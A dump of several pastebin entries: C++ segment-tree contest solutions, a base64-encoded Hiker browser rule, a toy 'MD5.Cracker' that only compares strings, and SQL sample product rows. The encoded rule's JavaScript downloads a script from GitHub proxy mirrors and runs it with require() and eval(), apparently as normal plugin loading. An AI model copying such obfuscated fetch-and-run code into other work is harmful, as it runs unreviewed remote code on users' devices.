    if (r-l==1){
        if (a[l]==0){
            tree[v].pref=1;
            tree[v].suf=1;
            tree[v].ans=1;
        }else{
            tree[v].pref=0;
            tree[v].suf=0;
            tree[v].ans=0;
        }
        return;
    }
    int m=(l+r)/2;
    build(tree, a, 2*v+1, l, m);
    build(tree, a, 2*v+2, m, r);
    tree[v].ans=tree[2*v+1].suf+tree[2*v+2].pref;
    tree[v].ans=max(tree[v].ans, tree[2*v+1].ans);
    tree[v].ans=max(tree[v].ans, tree[2*v+2].ans);
    if (tree[2*v+2].ans==r-m){
        tree[v].suf=tree[2*v+1].suf+r-m;
    }else{
        tree[v].suf=tree[2*v+2].suf;
    }
    if (tree[2*v+1].ans==m-l) {
        tree[v].pref = m - l + tree[2 * v + 2].pref;
    }else{
        tree[v].pref=tree[2*v+1].pref;
    }
}
void change(vector<Note>& tree, vector<int>& a, int v, int l, int r, int pos, int x){
    if (r-l==1){
        if (x==0){
            tree[v].pref=1;
            tree[v].suf=1;
            tree[v].ans=1;
        }else{
            tree[v].pref=0;
            tree[v].suf=0;
            tree[v].ans=0;
        }
        return;
    }
    int m=(r+l)/2;
    if (pos<m){
        change(tree, a, 2*v+1, l, m, pos, x);
    }else{
        change(tree, a, 2*v+2, m,r, pos, x);
    }
    tree[v].ans=tree[2*v+1].suf+tree[2*v+2].pref;
    tree[v].ans=max(tree[v].ans, tree[2*v+1].ans);
    tree[v].ans=max(tree[v].ans, tree[2*v+2].ans);
    if (tree[2*v+2].ans==r-m){
        tree[v].suf=tree[2*v+1].suf+r-m;
    }else{
        tree[v].suf=tree[2*v+2].suf;
    }
    if (tree[2*v+1].ans==m-l) {
        tree[v].pref = m - l + tree[2 * v + 2].pref;
    }else{
        tree[v].pref=tree[2*v+1].pref;
    }
}
int ans(vector<Note>& tree, vector<int>& a, int v, int l, int r, int L, int R){
    if (L>=r || R<=l){
        return 0;
    }
    if (L<=l && R>=r){
        //cout<<l<<"" ""<<r<<"" ""<<L<<"" ""<<R<<"" ""<<tree[v].ans<<""\n"";
        return tree[v].ans;
    }
    int m=(r+l)/2;
    if (L<m && R<m){
        return ans(tree, a, 2*v+1, l, m, L, R);
    }
    if (L>=m && R>=m){
        return ans(tree, a, 2*v+2, m, r, L, R);
    }
    //cout<<l<<"" ""<<r<<"" ""<<L<<"" ""<<R<<"" ""<<min(m-L, tree[2*v+1].suf)+min(R-m, tree[2*v+2].pref)<<""\n"";
    int y=min(m-L, tree[2*v+1].suf)+min(R-m, tree[2*v+2].pref);
    y=max(y, ans(tree, a, 2*v+1, l, m, L, R));
    y=max(y, ans(tree, a, 2*v+2, m, r, L, R));
    return y;
}
int main(){
    int n;
    cin>>n;
    vector<int> a(n);
    for (int i=0; i<n; i++){
        cin>>a[i];
    }
    vector<Note> tree(4*n);
    build(tree, a, 0, 0, n);
    int m;
    cin>>m;
    for (int j=0; j<m; j++){
        string s;
        cin>>s;
        if (s==""UPDATE""){
            int i, x;
            cin>>i>>x;
            i--;
            a[i]=x;
            change(tree, a, 0, 0, n, i, x);
        }else{
            int l, r;
            cin>>l>>r;
            l--;
            cout<<ans(tree, a, 0, 0, n, l, r)<<""\n"";
        }
    }
}

//D
#include <iostream>
#include <vector>
#include <string>
#define int long long
using namespace std;
void build(vector<int>& tree, vector<int>& a, int v, int l, int r){
    if (r-l==1){
        tree[v]=a[l];
        return;
    }
    int m=(r+l)/2;
    build(tree, a, 2*v+1, l, m);
    build(tree, a, 2*v+2, m, r);
    tree[v]=tree[2*v+1]+tree[2*v+2];
    return;
}
void change(vector<int>& tree, vector<int>&  a, int v, int l, int r, int pos, int x){
    if (r-l==1){
        tree[v] = x;
        return;
    }
    int m=(r+l)/2;
    if (pos<m){
        change(tree, a, 2*v+1, l, m, pos, x);
    }else{
        change(tree, a, 2*v+2, m, r, pos, x);
    }
    tree[v]=tree[2*v+1]+tree[2*v+2];
    return;
}
int sum(vector<int>& tree, vector<int>& a, int v, int l, int r, int L, int R){
    if (L>=r || R<=l){
        return 0;
    }
    if (L<=l && R>=r){
        return tree[v];
    }
    int m=(r+l)/2;
    int ans=sum(tree, a, 2*v+1, l, m, L, R)+sum(tree, a, 2*v+2, m, r, L, R);
    return ans;
}
signed main(){
    ios::sync_with_stdio(false);
    cin.tie(nullptr);
    cout.tie(nullptr);
    int n;
    cin>>n;
    vector<int> a(n);
    for (int i=0; i<n; i++){
        cin>>a[i];
        if (a[i]==0){
            a[i]=1;
        }else{
            a[i]=0;
        }
    }
    vector<int> tree(4*n);
    build(tree, a, 0, 0, n);
    int m;
    cin>>m;
    for (int i=0; i<m; i++){
        char x;
        cin>>x;
        if (x=='u') {
            int p, q;
            cin >> p >> q;
            p--;
            if (q==0){
                a[p]=1;
            }else{
                a[p]=0;
            }
            change(tree, a, 0, 0, n, p, a[p]);
        }else{
            int p, q, k;
            cin>>p>>q>>k;
            p--;
            int l=p;
            int r=q+1;
            while(r-l>1){
                int m=(r+l)/2;
                if (sum(tree, a, 0, 0, n, p, m)<k){
                    l=m;
                }else{
                    r=m;
                }
            }
            if (r==q+1){
                cout<<""-1""<<""\n"";
            }else{
                cout<<r<<""\n"";
            }
        }
    }
}


//F
#include <bits/stdc++.h>
#define int long long
using namespace std;
struct Note{
    int l;
    int r;
    int ans;
    int d=0;
};
void build(vector<Note>& tree, vector<int>& a, int L, int R, int i){
    tree[i].l=L;
    tree[i].r=R;
    if (R-L==1){
        tree[i].ans=a[L];
        return;
    }
    int M=(R+L)/2;
    build(tree, a, L, M, 2*i+1);
    build(tree, a, M, R, 2*i+2);
    tree[i].ans=max(tree[2*i+1].ans, tree[2*i+2].ans);
}
void push(vector<Note>& tree, int i){
    tree[2*i+1].d+=tree[i].d;
    tree[2*i+2].d+=tree[i].d;
    tree[i].d=0;
}
void change(vector<Note>& tree, int i, int x, int L, int R){
    if (tree[i].l>=R || tree[i].r<=L){
        return;
    }
    if(tree[i].l>=L && tree[i].r<=R){
        tree[i].d+=x;
        return;
    }
    push(tree, i);
    change(tree, 2*i+1, x, L, R);
    change(tree, 2*i+2, x, L, R);
    tree[i].ans=max(tree[2*i+1].ans+tree[2*i+1].d, tree[2*i+2].ans+tree[2*i+2].d);
}
int answer(vector<Note>& tree, int i, int L, int R){
    if (tree[i].l>=R || tree[i].r<=L){
        return -1;
    }
    if(tree[i].l>=L && tree[i].r<=R){
        return tree[i].ans+tree[i].d;
    }
    push(tree, i);
    int m1=answer(tree, 2*i+1, L, R);
    int m2=answer(tree, 2*i+2, L, R);
    tree[i].ans=max(tree[2*i+1].ans+tree[2*i+1].d, tree[2*i+2].ans+tree[2*i+2].d);
    return max(m1, m2);
}
signed main(){
    int n;
    cin>>n;
    vector<int> a(n);
    for (int i=0; i<n; i++){
        cin>>a[i];
    }
    vector<Note> tree(4*n);
    build(tree, a, 0, n, 0);
    int M;
    cin>>M;
    for (int i=0; i<M; i++){
        char x;
        cin>>x;
        if (x=='a'){
            int L, R, add;
            cin>>L>>R>>add;
            L--;
            change(tree, 0, add, L, R);
        }else{
            int i;
            cin>>i;
            i--;
            cout<<answer(tree, 0, i, i+1)<<""\n"";
        }
    }
    return 0;
}

//H
#include <bits/stdc++.h>
using namespace std;
const int N = 1000000;
string a;
struct Node {
    int open;
    int closed;
};
Node t[4*N];
#define left  2 * v + 1
#define right  2 * v + 2
Node merge(Node l, Node r) {
    Node res;
    res.open = r.open;
    res.closed = l.closed;
    if (l.open >= r.closed) {
        res.open += l.open - r.closed;
    }
    else {
        res.closed += r.closed - l.open;
    }
    return res;
}
void build(int v, int l, int r) {
    if (r - l == 1) {
        if (a[l] == '(') {
            t[v] = Node { 1, 0 };
        }
        else {
            t[v] =  Node{ 0,1 };
        }
    }
    else {
        int m = (r + l) / 2;
        build(left, l, m);
        build(right, m, r);
        t[v] = merge(t[left], t[right]);
    }
}

Node result(int v, int l, int r, int ql, int qr) {
    if (l >= ql && r <= qr) {
        return t[v];
    } else if (r <= ql || l >= qr) {
        return Node{0, 0};
    } else {
        int m = (r + l) / 2;
        Node p = result(left, l, m, ql, qr);
        Node q = result(right, m, r, ql, qr);
        return merge(p, q);

    }
}
int main() {
    ios_base::sync_with_stdio(0);
    cin.tie(0);
    cin >> a;
    int k;
    cin >> k;
    int n = a.size();
    build(0, 0, n);
    for (int i = 0; i < k; ++i) {
        int l; int r;
        cin >> l >> r;
        l--;
        auto x = result(0, 0, n, l, r);
        cout << (r - l) - (x.open + x.closed) << '\n';
    }
}


//G
#include <bits/stdc++.h>
using namespace std;
void build(vector<int>& tree, int idx, int l, int r, vector<int>& a){
    if (r-l==1){
        tree[idx]=a[l];
        return;
    }
    int m=(l+r)/2;
    build(tree, 2*idx+1, l, m, a);
    build(tree, 2*idx+2, m, r, a);
    tree[idx]=max(tree[2*idx+1], tree[2*idx+2]);
}
void change(vector<int>& tree, int idx, int l, int r, int i, int x){
    if (l>i || r<=i){
        return;
    }
    if (r-l==1){
        tree[idx]=x;
        return;
    }
    int m=(l+r)/2;
    change(tree, 2*idx+1, l, m, i, x);
    change(tree, 2*idx+2, m, r, i, x);
    tree[idx]=max(tree[2*idx+1], tree[2*idx+2]);
}
int maximum(vector<int>& tree, int idx, int l, int r, int L, int R){
    if (l>=R || r<=L){
        return -1;
    }
    if (l>=L && r<=R){
        return tree[idx];
    }
    int m=(l+r)/2;
    return max(maximum(tree, 2*idx+1, l, m, L, R), maximum(tree, 2*idx+2, m, r, L, R));
}
int ans(vector<int>& tree, int idx, int l, int r, int L, int R, int x){
    if (r-l==1){
        if (l>=L && l<R && tree[idx]>=x){
            return l;
        }
        return -2;
    }
    int m=(l+r)/2;
    int t=-2;
    if (!(l>=R || r<=L)){
        if (tree[2*idx+1]>=x){
            t=ans(tree, 2*idx+1, l, m, L, R, x);
        }
    }
    if (t!=-2){
        return t;
    }
    return ans(tree, 2*idx+2, m, r, L, R, x);
}
int main(){
    ios::sync_with_stdio(0);
    cin.tie(0);
    cout.tie(0);
    int n, m;
    cin>>n>>m;
    vector<int> a(n);
    for (int i=0; i<n; i++){
        cin>>a[i];
    }
    vector<int> tree(4*n);
    build(tree, 0, 0, n, a);
    while(m--){
        int t, i, x;
        cin>>t>>i>>x;
        i--;
        if (t==0){
            change(tree, 0, 0, n, i, x);
            a[i]=x;
        }else{
            cout<<ans(tree, 0, 0, n, i, n, x)+1<<""\n"";
        }
    }
}
"
iQ4k5TaL,邀您一起看：⚙直播设置⚙,xiaomianao666,JavaScript,Saturday 4th of May 2024 02:34:35 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥⚙直播设置⚙@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuS6keWPo+S7pOWvvOWFpVwiLFwicGF0aFwiOlwiY2xvdWRpbXBvcnRcIixcInJ1bGVcIjpcImZ1bmN0aW9uIGNsb3VkaW1wb3J0KCkge1xcbiAgICBsZXQgcmVtb3RlZmlsZTtcXG4gICAgbGV0IGNmZ2ZpbGUgPSBcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy9TcmMvSnV5aW5nL2NvbmZpZy5qc29uXFxcIjtcXG4gICAgaWYgKGZpbGVFeGlzdChjZmdmaWxlKSkge1xcbiAgICAgICAgZXZhbChcXFwibGV0IEp1Y29uZmlnPVxcXCIgKyBmZXRjaChjZmdmaWxlKSArIFxcXCI7XFxcIik7XFxuICAgICAgICByZW1vdGVmaWxlID0gSnVjb25maWdbXFxcIuS+nei1llxcXCJdLm1hdGNoKC9odHRwKHMpPzpcXFxcL1xcXFwvLipcXFxcLy8pWzBdICsgJ1NyY0p5U2V0LmpzJztcXG4gICAgfVxcbiAgICBpZihyZW1vdGVmaWxlKXtcXG4gICAgICAgIHJlcXVpcmUocmVtb3RlZmlsZSk7XFxuICAgICAgICByZXR1cm4gSllpbXBvcnQoaW5wdXQpO1xcbiAgICB9ZWxzZXtcXG4gICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/msqHmnInnlKjov4fogZrlvbHiiJrlsI/nqIvluo/vvJ9cXFwiO1xcbiAgICB9XFxufVxcbiQuZXhwb3J0cyA9IGNsb3VkaW1wb3J0KCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLkvp3otZbmlofku7ZcIixcInBhdGhcIjpcImNvbmZpZ1wiLFwicnVsZVwiOlwianM6XFxuJC5leHBvcnRzLnZlcnNpb24gPSAxMTtcIn1dLFwic2F2ZWRcIjpmYWxzZSxcInRpdGxlXCI6XCLogZrlvbHiiJpcIixcInZlcnNpb25cIjowLFwidXJsXCI6XCJoaWtlcjovL2VtcHR5I25vUmVjb3JkSGlzdG9yeSM7Z2V0O1VURi04O3tVc2VyLUFnZW50QE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjDvvJvvvJsgV2luNjTvvJvvvJsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA1LjAuMC4wIFNhZmFyaS81MzcuMzZ9XCIsXCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwiZmluZF9ydWxlXCI6XCJqczooXFxuKCkgPT4ge1xcbiAgICByZXF1aXJlKGNvbmZpZy7kvp3otZYubWF0Y2goL2h0dHAocyk/OlxcXFwvXFxcXC8uKlxcXFwvLylbMF0gKyBcXFwiU3JjTGl2ZS5qc1xcXCIpO1xcbiAgICBMaXZlU2V0KCk7XFxufVxcbikoKVwiLFwiZ3JvdXBcIjpcIjHlvbHop4ZcIixcInVhXCI6XCJwY1wiLFwicHJlUnVsZVwiOlwiaWYgKCFjb25maWcu5L6d6LWWKSB7XFxuICAgIC8v6L+c56iL5L6d6LWW57Si5byV5paH5Lu25Luj55CG5Zyw5Z2A5YiX6KGoXFxuICAgIGxldCByZXF1aXJlbGlzdCA9IFt7IHVybDogJ2h0dHBzOi8vZ2hwcm94eS5uZXQvaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLycsIHNvcnQ6IDAgfSwgeyB1cmw6ICdodHRwczovL2doLmNvbi5zaC9odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vJywgc29ydDogMCB9LCB7IHVybDogJ2h0dHBzOi8vZ2l0aHViLmpldm9ucy52aXAvaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLycsIHNvcnQ6IDAgfV1cXG4gICAgbGV0IHJlcXVpcmVmaWxlID0gXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvU3JjL3JlcXVpcmUuanNvblxcXCI7XFxuICAgIGlmIChmZXRjaChyZXF1aXJlZmlsZSkpIHtcXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgZXZhbChcXFwicmVxdWlyZWxpc3Q9XFxcIiArIGZldGNoKHJlcXVpcmVmaWxlKSArIFxcXCI7XFxcIik7XFxuICAgICAgICB9IGNhdGNoIChlKSB7IH1cXG4gICAgfVxcbiAgICByZXF1aXJlbGlzdC5zb3J0KGZ1bmN0aW9uICh4LCB5KSB7XFxuICAgICAgICBpZiAoeC5zb3J0IDwgeS5zb3J0KSB7XFxuICAgICAgICAgICAgcmV0dXJuIC0xO1xcbiAgICAgICAgfSBlbHNlIGlmICh4LnNvcnQgPiB5LnNvcnQpIHtcXG4gICAgICAgICAgICByZXR1cm4gMTtcXG4gICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgcmV0dXJuIDA7XFxuICAgICAgICB9XFxuICAgIH0pO1xcbiAgICBmb3IgKGxldCBpID0gMDsgaSA8IHJlcXVpcmVsaXN0Lmxlbmd0aDsgaSsrKSB7XFxuICAgICAgICB0cnkgeyAvL+i/nOeoi+S+nei1lue0ouW8lVxcbiAgICAgICAgICAgIHJlcXVpcmUocmVxdWlyZWxpc3RbaV0udXJsICsgJ3NyYzQ4NTk3OTYyL2hrL21hc3Rlci9yZXF1aXJlLmpzJywgeyB0aW1lb3V0OiAyMDAwIH0pO1xcbiAgICAgICAgICAgIGlmIChyZWx5ZmlsZSkge1xcbiAgICAgICAgICAgICAgICBicmVhaztcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICAgICAgcmVxdWlyZWxpc3RbaV0uc29ydCsrO1xcbiAgICAgICAgICAgIGxvZyhlLm1lc3NhZ2UpO1xcbiAgICAgICAgfVxcbiAgICB9XFxuICAgIHdyaXRlRmlsZShyZXF1aXJlZmlsZSwgSlNPTi5zdHJpbmdpZnkocmVxdWlyZWxpc3QpKTtcXG4gICAgaW5pdENvbmZpZyh7XFxuICAgICAgICDkvp3otZY6IHJlbHlmaWxlXFxuICAgIH0pO1xcbiAgICBsZXQgY2ZnZmlsZSA9IFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL1NyYy9KdXlpbmcvY29uZmlnLmpzb25cXFwiO1xcbiAgICBpZiAoZmlsZUV4aXN0KGNmZ2ZpbGUpKSB7XFxuICAgICAgICB0cnkge1xcbiAgICAgICAgICAgIGV2YWwoXFxcImxldCBKdWNvbmZpZz1cXFwiICsgZmV0Y2goY2ZnZmlsZSkgKyBcXFwiO1xcXCIpO1xcbiAgICAgICAgICAgIEp1Y29uZmlnW1xcXCLkvp3otZZcXFwiXSA9IHJlbHlmaWxlO1xcbiAgICAgICAgICAgIHdyaXRlRmlsZShjZmdmaWxlLCBKU09OLnN0cmluZ2lmeShKdWNvbmZpZykpO1xcbiAgICAgICAgfSBjYXRjaCAoZSkgeyB9XFxuICAgIH1cXG59XFxuLy9ieS7luIXiiJpg5Lq65omNIOiBmuW9seaooeadv++8gVwiLFwicGFnZXNcIjpcIlt7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLkupHlj6Pku6Tlr7zlhaVcXFwiLFxcXCJwYXRoXFxcIjpcXFwiY2xvdWRpbXBvcnRcXFwiLFxcXCJydWxlXFxcIjpcXFwiZnVuY3Rpb24gY2xvdWRpbXBvcnQoKSB7XFxcXG4gICAgbGV0IHJlbW90ZWZpbGU7XFxcXG4gICAgbGV0IGNmZ2ZpbGUgPSBcXFxcXFxcImhpa2VyOi8vZmlsZXMvcnVsZXMvU3JjL0p1eWluZy9jb25maWcuanNvblxcXFxcXFwiO1xcXFxuICAgIGlmIChmaWxlRXhpc3QoY2ZnZmlsZSkpIHtcXFxcbiAgICAgICAgZXZhbChcXFxcXFxcImxldCBKdWNvbmZpZz1cXFxcXFxcIiArIGZldGNoKGNmZ2ZpbGUpICsgXFxcXFxcXCI7XFxcXFxcXCIpO1xcXFxuICAgICAgICByZW1vdGVmaWxlID0gSnVjb25maWdbXFxcXFxcXCLkvp3otZZcXFxcXFxcIl0ubWF0Y2goL2h0dHAocyk/OlxcXFxcXFxcL1xcXFxcXFxcLy4qXFxcXFxcXFwvLylbMF0gKyAnU3JjSnlTZXQuanMnO1xcXFxuICAgIH1cXFxcbiAgICBpZihyZW1vdGVmaWxlKXtcXFxcbiAgICAgICAgcmVxdWlyZShyZW1vdGVmaWxlKTtcXFxcbiAgICAgICAgcmV0dXJuIEpZaW1wb3J0KGlucHV0KTtcXFxcbiAgICB9ZWxzZXtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/msqHmnInnlKjov4fogZrlvbHiiJrlsI/nqIvluo/vvJ9cXFxcXFxcIjtcXFxcbiAgICB9XFxcXG59XFxcXG4kLmV4cG9ydHMgPSBjbG91ZGltcG9ydCgpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuS+nei1luaWh+S7tlxcXCIsXFxcInBhdGhcXFwiOlxcXCJjb25maWdcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG4kLmV4cG9ydHMudmVyc2lvbiA9IDExO1xcXCJ9XVwifSIsInBpY1VybCI6Imhpa2VyOi8vZmlsZXMvY2FjaGUvc3JjL+iBmuW9sS5wbmciLCJ0aXRsZSI6IuKameebtOaSreiuvue9ruKamSJ9
L5XteLSn,MD5.Cracker,Tark_Wight,C++,Saturday 4th of May 2024 02:17:04 AM CDT,"#include<iostream>
#include <string>
#include <tchar.h>

static const char* firstHashString = ""qwertyuioplkjhgfdaszxcvbnmkjhgfdsaqwertyuikjh"" \
""gbvfdsazxdcvgbhnjikmjhbgfvcdsazxdcfrewqikolkjnhgfqwertyuioplkjh"" \
""gfdaszxcvbnmkjhgfdsaqwertyuikjhgbvfdsazxdcvgbhnjikmjhbgfvcdsa"" \
""zxdcfrewqikolkjnhgfq123"";

static const char* secondHashString = ""qaswderftgyhujikolpmnbvcxzasxdcfvgbhnjmkijuy"" \
""gtfdeswaqscfvgyjqaswderftgyhujikolpmnbvcxzasxdcfvgbhnjmkijuyg"" \
""tfdeswaqscfvgyjqaswderftgyhujikolpmnbvcxzasxdcfvgbhnjmkijuygt"" \
""tfdeswaqscfvgyjqwertyuikja2"";


int good() {
  int ficha;
  std::cout<<""Good, nice programme!"";
  std::cin>>ficha;

  return 0;
}

int bed() {
  int ficha;
  for(int i=0; i<1000; i++) {
	std::cout<<""Evil, evil code!"";
  }

  std::cin>>ficha;
  return 0;
}

int _tmain(int argc, _TCHAR* argv[]) {
  std::string firstString=firstHashString;  
  std::string secondString=secondHashString;

  firstString.erase(0,56);
  firstString.erase(128,8);
  secondString.erase(0,64);

  if (firstString==secondString) {
	return good();
  } else {
	return bed();
  }

  return 0;
}"
fqP2Vpfj,2000 example products data - SQL,rezamalik15,MySQL,Saturday 4th of May 2024 02:16:51 AM CDT,"CREATE TABLE product (
	id INT(10),
	name VARCHAR(200),
	brand VARCHAR(100),
	price DOUBLE(10,2),
	stock INT(10)
);

INSERT INTO products (id, name, brand, price, stock) 
VALUES
(9119,'Intelligent Metal Mouse','Asus','445373.00',435),
(2083,'Sleek Bronze Sausages','Unilever','443311.00',306),
(3498,'Elegant Soft Tuna','ZTE','685402.00',124),
(3256,'Licensed Bronze Chips','Gucci','581346.00',223),
(9319,'Elegant Rubber Shirt','Intel','438976.00',993),
(6484,'Practical Wooden Chair','Sharp','855026.00',207),
(5200,'Handmade Plastic Car','Motorola','864418.00',138),
(3862,'Fantastic Soft Chicken','Logitech','856128.00',705),
(6394,'Oriental Steel Pizza','Sharp','450527.00',697),
(7949,'Tasty Plastic Shoes','Microsoft','569773.00',686),
(4231,'Luxurious Wooden Cheese','Adobe','554890.00',603),
(7836,'Incredible Granite Chips','Samsung','663965.00',386),
(3848,'Small Soft Keyboard','Toshiba','638145.00',706),
(6021,'Luxurious Cotton Ball','FedEx','787590.00',729),
(1266,'Oriental Wooden Ball','Kawasaki','170488.00',994),
(2390,'Gorgeous Plastic Cheese','IBM','686041.00',467),
(8135,'Refined Wooden Keyboard','Crocs','81357.00',784),
(1354,'Elegant Cotton Fish','Nvidia','52513.00',393),
(5331,'Modern Plastic Fish','Vans','849949.00',858),
(8828,'Modern Cotton Ball','Logitech','363799.00',726),
(4800,'Modern Cotton Ball','Alienware','62354.00',611),
(1614,'Intelligent Steel Cheese','ZTE','79947.00',681),
(8765,'Ergonomic Steel Keyboard','Nvidia','958267.00',665),
(3790,'Bespoke Fresh Pizza','Porsche','214681.00',909),
(9418,'Modern Frozen Shirt','Aisan','503288.00',994),
(8463,'Elegant Concrete Mouse','Ferarri','654960.00',537),
(2003,'Fantastic Steel Chair','Uber','871477.00',496),
(4599,'Licensed Cotton Hat','Microsoft','337925.00',898),
(1615,'Licensed Cotton Pants','AMD','674415.00',815),
(1286,'Refined Metal Pizza','Lamborghini','708737.00',146),
(4618,'Awesome Cotton Pizza','Robot','24721.00',356),
(8321,'Tasty Fresh Salad','Audi','778122.00',846),
(8602,'Small Granite Table','Toshiba','290028.00',860),
(9579,'Refined Frozen Cheese','Intel','183395.00',534),
(7912,'Oriental Bronze Sausages','Toyota','404584.00',935),
(6689,'Bespoke Concrete Bike','Suzuki','763390.00',244),
(5231,'Elegant Plastic Pizza','Philips','953647.00',267),
(8202,'Bespoke Steel Ball','Xiaomi','381393.00',601),
(1213,'Handmade Granite Mouse','HTC','834280.00',164),
(2197,'Elegant Concrete Chips','Sharp','534023.00',865),
(9180,'Refined Bronze Chicken','Disney','267052.00',504),
(4678,'Awesome Steel Salad','Crocs','159050.00',749),
(9302,'Elegant Steel Chips','Robot','752864.00',951),
(3560,'Tasty Bronze Pants','Disney','815105.00',818),
(3265,'Intelligent Fresh Bacon','Xiaomi','105856.00',789),
(7351,'Tasty Fresh Ball','Alienware','434930.00',286),
(4589,'Ergonomic Granite Computer','Aisan','152986.00',199),
(1779,'Ergonomic Frozen Chair','Xiaomi','211809.00',423),
(3162,'Handmade Metal Fish','Kawasaki','722124.00',973),
(3534,'Refined Concrete Car','Mitsubishi','180776.00',531),
(1872,'Modern Rubber Pants','Huawei','903534.00',785),
(5281,'Licensed Plastic Keyboard','3M','711513.00',549),
(4717,'Generic Fresh Tuna','Pepsodent','422060.00',585),
(9344,'Intelligent Bronze Car','Lenovo','485800.00',189),
(6099,'Gorgeous Bronze Mouse','Uber','90635.00',447),
(6365,'Awesome Plastic Gloves','Motorola','762065.00',593),
(4785,'Electronic Granite Chips','Huawei','577522.00',676),
(8878,'Oriental Rubber Fish','ZTE','179805.00',790),
(8923,'Incredible Plastic Soap','Samsung','353780.00',227),
(3459,'Incredible Rubber Chicken','Nike','157764.00',622),
(9556,'Tasty Plastic Bacon','Suzuki','811431.00',849),
(3522,'Tasty Fresh Bike','Sony','527467.00',976),
(6579,'Handcrafted Granite Bacon','IBM','817460.00',622),
(5107,'Awesome Metal Fish','Aisan','497952.00',940),
(7249,'Modern Metal Keyboard','Mercedes','545023.00',603),
(2764,'Refined Steel Table','HTC','984388.00',204),
(7350,'Incredible Granite Salad','Audi','660624.00',796),
(7653,'Modern Steel Chips','Chanel','838424.00',136),
(2030,'Recycled Bronze Ball','HBO','695322.00',330),
(4453,'Tasty Metal Soap','Amazon','686414.00',642),
(9726,'Small Rubber Chips','Gucci','896943.00',351),
(2936,'Tasty Fresh Chips','Microsoft','353926.00',614),
(6754,'Practical Wooden Salad','Lenovo','325837.00',783),
(2926,'Unbranded Concrete Soap','Apple','501015.00',222),
(7486,'Refined Fresh Gloves','Adobe','357658.00',790),
(1220,'Licensed Metal Bike','Nokia','111439.00',391),
(9616,'Elegant Steel Mouse','Disney','248094.00',286),
(1700,'Electronic Steel Soap','Chanel','371277.00',915),
(2234,'Ergonomic Concrete Chips','Toyota','117013.00',226),
(6331,'Luxurious Frozen Cheese','Mitsubishi','120906.00',303),
(3887,'Licensed Steel Ball','Toyota','786222.00',519),
(9844,'Refined Fresh Pants','Huawei','706220.00',384),
(2377,'Elegant Rubber Mouse','Suzuki','985647.00',761),
(1064,'Awesome Plastic Bacon','Pepsodent','919633.00',255),
(2732,'Fantastic Fresh Keyboard','Philips','658076.00',253),
(5420,'Sleek Rubber Mouse','Pepsodent','461781.00',105),
(7398,'Generic Steel Hat','Huawei','15554.00',234),
(7437,'Awesome Metal Chips','ZTE','709521.00',387),
(2812,'Fantastic Wooden Chair','Asus','524053.00',173),
(7299,'Elegant Cotton Car','Pepsodent','154347.00',949),
(2263,'Awesome Wooden Fish','Lamborghini','620494.00',229),
(6071,'Small Concrete Mouse','Mitsubishi','257871.00',633),
(4595,'Electronic Frozen Chips','Lenovo','909673.00',218),
(2121,'Sleek Soft Ball','ZTE','357524.00',702),
(2565,'Sleek Concrete Fish','Philips','748569.00',182),
(7428,'Incredible Fresh Keyboard','Unilever','552163.00',897),
(3837,'Elegant Steel Soap','Polytron','618032.00',339),
(3224,'Recycled Soft Pizza','Robot','918888.00',762),
(4008,'Luxurious Cotton Salad','Unilever','251901.00',627),
(6012,'Incredible Metal Table','Samsung','847926.00',383),
(5094,'Gorgeous Bronze Bacon','Ferarri','51393.00',336),
(4808,'Intelligent Bronze Shoes','Kawasaki','102199.00',887),
(6125,'Licensed Granite Ball','Alienware','95579.00',985),
(3613,'Awesome Wooden Car','Philips','170499.00',177),
(9324,'Gorgeous Cotton Mouse','Mitsubishi','731194.00',448),
(5335,'Recycled Wooden Chicken','Lamborghini','640700.00',795),
(1785,'Practical Rubber Gloves','Motorola','192584.00',878),
(4775,'Luxurious Metal Computer','Uber','90707.00',363),
(5334,'Modern Wooden Hat','Audi','712946.00',779),
(1733,'Practical Wooden Table','Nike','485039.00',726),
(6721,'Unbranded Fresh Pizza','Amazon','585111.00',998),
(6243,'Handmade Cotton Pizza','Uniqlo','517470.00',855),
(7303,'Generic Steel Shirt','HTC','147004.00',361),
(7609,'Generic Concrete Bike','Mercedes','404643.00',847),
(8518,'Modern Plastic Chicken','HTC','787316.00',401),
(5055,'Tasty Wooden Pizza','Acer','844431.00',782),
(5648,'Modern Steel Pants','Crocs','870830.00',259),
(1592,'Modern Granite Chips','Hyundai','207750.00',648),
(7297,'Practical Concrete Towels','Sharp','535211.00',744),
